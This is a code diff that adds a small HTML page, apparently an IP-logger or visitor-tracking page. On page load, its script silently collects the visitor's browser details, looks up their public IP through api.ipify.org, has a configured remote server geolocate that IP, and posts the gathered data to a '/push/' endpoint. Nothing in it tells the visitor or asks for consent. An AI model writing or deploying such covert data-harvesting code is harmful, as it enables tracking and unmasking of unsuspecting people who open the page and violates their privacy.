@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<script src="/resource/javascript/config.js"></script>
+<script>
+    // Get IP Info
+    var info = "[ navigator ] /n" +
+            "Platform: "+navigator.platform + "/n" +
+            "UserAgent: " + navigator.userAgent + '/n' +
+            "Language: " + navigator.language + "/n" +
+            "Geolocation: " + navigator.geolocation + '/n' +
+            "OnLine: " + navigator.onLine + "/n" +
+            "AppName: "+navigator.appName + '/n' +
+            "CookieEnabled: " + navigator.cookieEnabled;
+
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET","https://api.ipify.org/",false)
+        xhr.send();
+        info += "\n" + "IP: "+xhr.responseText;
+
+        var ip_xhr = new XMLHttpRequest();
+        ip_xhr.open('GET' , remote+'/get_ip_location/'+xhr.responseText , false);
+        ip_xhr.send();
+        info += "\n\nIP Info: " + ip_xhr.responseText;
+    } catch (e) {
+        console.log(1)
+    }
+
+    var url = window.location.href;
+    var http = new XMLHttpRequest();
+    http.open('POST' , String('/push/'+url.substring(remote.length)+'/'+info).replace('//','/') , false);
+    http.send();
+</script>
